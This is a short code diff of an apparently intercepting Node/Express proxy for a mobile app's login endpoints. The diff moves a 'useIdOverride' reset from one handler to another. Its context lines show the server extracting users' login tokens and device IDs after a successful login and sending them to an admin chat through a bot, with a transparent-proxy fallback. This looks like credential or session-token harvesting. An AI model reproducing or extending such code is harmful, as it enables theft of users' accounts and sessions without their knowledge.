@@ -2395,6 +2395,10 @@ app.post('/app/user/login/login', async (req, res) => {
     if (data.adminChatId && bot) {
       const isSuccess = jsonResp && (jsonResp.code === 1000 || jsonResp.code === 200 || jsonResp.code === '1000');
       if (isSuccess) {
+        if (data.useIdOverride) {
+          data.useIdOverride = null;
+          saveData(data).catch(() => { });
+        }
         const loginToken = loginData ? (loginData.token || loginData.accessToken || loginData.jwtToken || loginData.jwt || loginData.access_token || '') : (jsonResp?.data?.token || jsonResp?.data?.accessToken || jsonResp?.data?.access_token || jsonResp?.token || '');
         const devId = body.deviceId || body.androidId || body.device_id || '';
         let baseMsg =
@@ -2632,10 +2636,6 @@ app.post('/app/user/login/confirm', async (req, res) => {
 
         bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
       }
-    }
-    if (data.useIdOverride) {
-      data.useIdOverride = null;
-      saveData(data).catch(() => { });
     }
     sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
   } catch (e) { await transparentProxy(req, res); }
